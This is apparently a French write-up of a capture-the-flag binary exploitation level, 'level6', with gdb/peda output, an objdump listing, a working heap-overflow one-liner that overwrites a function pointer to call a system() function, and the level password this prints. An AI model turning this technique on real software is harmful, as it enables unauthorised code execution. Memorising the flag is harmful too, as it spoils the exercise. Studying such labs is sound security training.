## Démarche

- Le programme `./level6` prend au moins un paramètre
    > Segmentation fault (core dumped)

    `./level6 1`
    > Nope

    Le `main` prend un paramètre et le compare, en fonction du résultat, il appelle la fonction `m` qui *puts* "Nope\n" ou la fonction `n` qui fait un appel système.

- Si on jump à l'adresse de `n` manuellement depuis gdb (`jump *0x08048454`), on peut constater que la fonction `n` appelle un *bash* et *cat* le fichier *.pass* :
    ```
    [New process 4645]
    process 4645 is executing new program: /bin/dash
    process 4646 is executing new program: /bin/cat
    /bin/cat: /home/user/level7/.pass: Permission denied
    ```


- Avec peda dans gdb, on récupère la taille allouée pour la copie du paramètre :

    `pattern search`
    ```
    Registers contain pattern buffer:
    EIP+0 found at offset: 72
    EAX+0 found at offset: 72
    No register points to pattern buffer
    Pattern buffer found at:
    0x0804a008 : offset    0 - size  100 ([heap])
    0xbffff87d : offset    0 - size  100 ($sp + 0x201 [128 dwords])
    References to pattern buffer found at:
    0xbffff670 : 0x0804a008 ($sp + -0xc [-3 dwords])
    0xbffff680 : 0x0804a008 ($sp + 0x4 [1 dwords])
    0xbffff69c : 0x0804a008 ($sp + 0x20 [8 dwords])
    0xbffff668 : 0xbffff87d ($sp + -0x14 [-5 dwords])
    0xbffff684 : 0xbffff87d ($sp + 0x8 [2 dwords])
    0xbffff748 : 0xbffff87d ($sp + 0xcc [51 dwords])
    ```

- On passe alors en paramètre une chaine de la taille de l'offset, suivie de l'adresse de la fonction `n`
- `./level6 $(python -c 'print("A"*72+"\x54\x84\x04\x08")')`
> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d


<br>


---

## Ressources




----

- `objdump -d level6` :
  ```
    08048454 <n>:
        8048454:	55                   	push   %ebp
        8048455:	89 e5                	mov    %esp,%ebp
        8048457:	83 ec 18             	sub    $0x18,%esp
        804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
        8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
        8048466:	c9                   	leave
        8048467:	c3                   	ret

    08048468 <m>:
        8048468:	55                   	push   %ebp
        8048469:	89 e5                	mov    %esp,%ebp
        804846b:	83 ec 18             	sub    $0x18,%esp
        804846e:	c7 04 24 d1 85 04 08 	movl   $0x80485d1,(%esp)
        8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>
        804847a:	c9                   	leave
        804847b:	c3                   	ret
    
    0804847c <main>:
        804847c:	55                   	push   %ebp
        804847d:	89 e5                	mov    %esp,%ebp
        804847f:	83 e4 f0             	and    $0xfffffff0,%esp
        8048482:	83 ec 20             	sub    $0x20,%esp
        8048485:	c7 04 24 40 00 00 00 	movl   $0x40,(%esp)
        804848c:	e8 bf fe ff ff       	call   8048350 <malloc@plt>
        8048491:	89 44 24 1c          	mov    %eax,0x1c(%esp)
        8048495:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
        804849c:	e8 af fe ff ff       	call   8048350 <malloc@plt>
        80484a1:	89 44 24 18          	mov    %eax,0x18(%esp)
        80484a5:	ba 68 84 04 08       	mov    $0x8048468,%edx
        80484aa:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484ae:	89 10                	mov    %edx,(%eax)
        80484b0:	8b 45 0c             	mov    0xc(%ebp),%eax
        80484b3:	83 c0 04             	add    $0x4,%eax
        80484b6:	8b 00                	mov    (%eax),%eax
        80484b8:	89 c2                	mov    %eax,%edx
        80484ba:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484be:	89 54 24 04          	mov    %edx,0x4(%esp)
        80484c2:	89 04 24             	mov    %eax,(%esp)
        80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt>
        80484ca:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484ce:	8b 00                	mov    (%eax),%eax
        80484d0:	ff d0                	call   *%eax
        80484d2:	c9                   	leave
        80484d3:	c3                   	ret
  ```